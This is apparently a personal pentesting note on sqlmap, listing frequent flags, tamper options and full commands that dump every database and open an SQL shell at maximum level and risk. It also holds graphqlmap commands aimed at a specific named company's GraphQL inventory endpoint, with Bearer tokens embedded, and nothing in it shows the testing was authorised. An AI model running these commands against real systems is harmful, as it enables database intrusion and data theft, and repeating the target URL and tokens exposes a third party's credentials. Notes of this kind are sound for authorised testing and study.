---
date: 2022-06-28
modified: 2022-07-14
---
## Metadata
up:: [[sqlmap]]

---
## Record Usage
**Freq Param**
```bash
--data="id=123"
--level 5 --risk 3
--sql-shell
--delay 0.2 --smart 
--force-ssl --fresh-queries
--random-agent # victim may store User-Agent, This setting may cause missing
--threads 10
-p <param>
--ignore-redirect

-T4 --dbs --tables --level 5 --risk 3 --sql-shell --smart --fresh-queries
```
[SQLMap - Cheetsheat - HackTricks](https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap)
**Used Param**
```bash
--no-cast
--randomize
--hex
```
[[sqlmap.Temper]]
**POST with JSON and STAR sign**
`-r REQUESTFILE      Load HTTP request from a file`
> 手動在要測試的參數的值，後綴加上 `*` 用以指定參數，使用帶 json 的，sqlmap 不支援 `-p` 指定參數，必須用星號
```bash
$ sqlmap -r rq.txt -T4 --current-db --dbs --tables --dump --level 5 --risk 3 --threads 10 --sql-shell --dbms=Mysql

# with Burp Listener
$ sqlmap -r try3woutstar.txt -T4 --random-agent --force-ssl --banner --current-db --dbs --tables --dump-all --level 5 --risk 3 --threads 10 --sql-shell --fresh-queries --proxy="http://192.168.3.19:9527" -v 3 --randomize

graphqlmap -u graphqlmap -u https://www.caco.com.tw/ims030/ims/storeinventory/graphql/listbyd1r1storeitemno -v --method POST  -v --method POST --headers '{"Authorization" : "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0ZXh0Ijoibm8gc2VjcmV0cyBoZXJlID1QIn0.JqqdOesC-R4LtOS9H0y7bIq-M8AGYjK92x4K3hcBA6o"}'

```

```
graphqlmap -u https://www.caco.com.tw/ims030/ims/storeinventory/graphql/listbyd1r1storeitemno -v --method POST --headers '{"Authorization" : "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1cG4iOiLjhIzwqaWW6IOE6ZOo6aC38JGEvuaPmPCimLjwl6q-8K2OqfCQmqXjiKvwqpek2Y3wpKGn5p2nIiwic3ViIjoiU0VDVVJJVFlfTE9HSU5fVEVNUCIsImdyb3VwcyI6WyJ0ZW1wb3JhcnkiXSwiY21wdWlkIjoiQjEwRjAwMDAyMSIsInN0b3JldWlkIjoiQjEwRjAwMDBYRCIsInVpZCI6IuOEjPCppZbog4Tpk6jpoLfwkYS-5o-Y8KKYuPCXqr7wrY6p8JCapeOIq_Cql6TZjfCkoafmnaciLCJlbnRhY2N0dWlkIjoiY29tLmNhY28uZXJwIiwid2Vic2l0ZXVpZCI6IkpyVk52SG1TQjg2ZHlWZngiLCJ1c2VyaWQiOiJ0ZW1wb3JhcnkiLCJ1c2VybmFtZSI6InRlbXBvcmFyeSIsImlhdCI6MTY1Nzg0OTU0MCwiZXhwIjoxNjU3ODc4MzQwLCJqdGkiOiI3NmU4N2QxOS1hNjVmLTRiMTgtODQ1ZC1kZTkyZTlhZmM0NTciLCJpc3MiOiJodHRwczovL3d3dy5jYWNvLmNvbS9pc3N1ZXIiLCJhdWQiOiJhbGwifQ.Fj-MN1SI_qeKVIBEbHbSaPPa70G9TQTm9IJ5a7dFB2NoF5CutJN1j61FORrKxkn5bPON1pjrk8tcXl7sAjtsArOiCcBj-nalbEvBtQg_vpZQu1BW3W79JjE8wt_g_FHhS7MBctMdFvUl61SbWuLx-eY9sFBjLXHGDTU34OI2rE-GtKKHEdh8utAq9DPtWGR8CWiK_rrCBDLTVKZ0Mln_jobrBpaA41kiK0I6S55NCZf58-L5PaNSg9898J3AcAinp1D06rNRUWLAhpU4UyDH8OMWQPUHB-vu5wvWrk-n0F4bIBjwbVfzhBw4mfjcrG_esTQ5eTLwpxAsrVz9k4rMRA"}'
```

